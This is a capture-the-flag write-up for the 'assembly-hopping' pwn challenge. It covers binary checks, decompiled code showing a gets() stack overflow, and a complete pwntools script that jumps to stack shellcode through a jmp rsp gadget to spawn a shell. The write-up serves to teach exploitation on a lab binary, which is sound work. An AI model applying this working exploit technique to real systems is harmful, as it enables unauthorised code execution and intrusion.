# assembly-hopping #


## Description ## 

Doesn't everyone love assembly?

```
nc assembly-hopping.challenges.ctf.ritsec.club 1337
```

## Analysis ## 

The usual things: 

```
$ file assembly 
assembly: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=12ba5f7935d8872fd9ba0609ce36d268bbe63d23, for GNU/Linux 3.2.0, not stripped
```

```
$ checksec assembly
[*] '/home/bugs/projects/ctf/ritsec/pwn/assembly-hopping/assembly'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

From this we learn that: 
- PIE is disabled so we can source ROP gadgets from the binary mapped at `0x400000`
- NX is also disabled, this means that we can execute instructions on the stack.

Let's take a look at the decompiled code: 

```c
undefined8 main(void)

{
  setuid(0);
  setgid(0);
  feedback_machine();
  return 0;
}

```

Main calls `feedback_machine()` 

```c

void feedback_machine(void)

{
  char local_d8 [208];
  
  puts(
      "[!] Okay, you proved yourself in the first challenge. This challenge is similar but with a li ttle twist."
      );
  puts("[!] Otherwise, pls give feedback of the challenges!!");
  gets(local_d8);
  puts("[!] Saved to our feedback database....");
  return;
}

```

This function is vulnerable to a trivial stack-based buffer overflow.

## Exploitation ## 
Exploiting this vulnerability is relatively simple, we need shellcode on the stack and a `jmp rsp` gadget. 

Let's find the gadget first: 
```
$ ROPgadget --binary ./assembly | grep -i 'jmp rsp'
[...]
0x0000000000401156 : jmp rsp
[...]
```

We can use `pwntools` to generate shellcode for us!

```python
#!/usr/bin/env python3
from pwn import * 

context.update(arch="amd64")

shellcode = asm(shellcraft.amd64.linux.sh())

jmp_rsp = 0x0000000000401156
payload = b"A" * 216
payload += p64(jmp_rsp)
payload += shellcode 

r = process("./assembly")
r.sendline(payload)

r.interactive()
```